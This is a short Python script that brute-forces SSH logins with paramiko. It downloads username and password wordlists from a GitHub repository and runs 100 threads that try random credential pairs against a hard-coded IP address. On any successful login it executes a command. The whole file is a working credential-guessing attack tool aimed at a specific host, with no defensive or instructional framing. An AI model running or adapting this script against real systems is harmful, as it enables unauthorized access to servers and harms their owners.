import paramiko
import random
import requests
import threading

host = "95.216.66.105"
port = 22
usernames = requests.get("https://raw.githubusercontent.com/o7-Fire/General/master/usernames.txt")
passwords = requests.get("https://raw.githubusercontent.com/o7-Fire/General/master/passwords.txt")
command = "ls"

def tryssh():
    while True:
        username = random.choice(usernames.text.split("\n"))
        password = random.choice(passwords.text.split("\n"))
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, password)
            stdin, stdout, stderr = ssh.exec_command(command)
            lines = stdout.readlines()
            print(lines)
        except:
            print("Didnt work")

if __name__ == '__main__':
    for i in range(100):
        t1 = threading.Thread(target=tryssh)
        t1.start()
